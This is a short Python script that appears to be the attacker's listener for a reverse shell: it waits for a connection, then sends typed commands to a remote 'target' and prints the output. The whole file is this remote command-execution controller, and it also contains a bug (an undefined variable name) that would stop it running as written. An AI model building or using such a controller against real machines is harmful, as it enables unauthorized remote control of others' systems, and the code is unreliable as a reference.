import socket

IP = input("please Enter IP to listen on: ")
port_ls = int(input("please enter Port to listen on: "))


def connect():

    s = socket.socket()
    s.bind((IP_Address, port_ls))
    s.listen(1) 
    print(f"listening on IP Address:{IP_Address} and port {port_ls}")
    conn, addr = s.accept()
    print ('connection from:', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command: 
            conn.send('terminate'.encode())
            conn.close()
            break

        else:
            conn.send(command.encode()) # Otherwise we will send the command to the target
            print( conn.recv(1024).decode()) # print the result that we got back

def main():
    connect()
main()
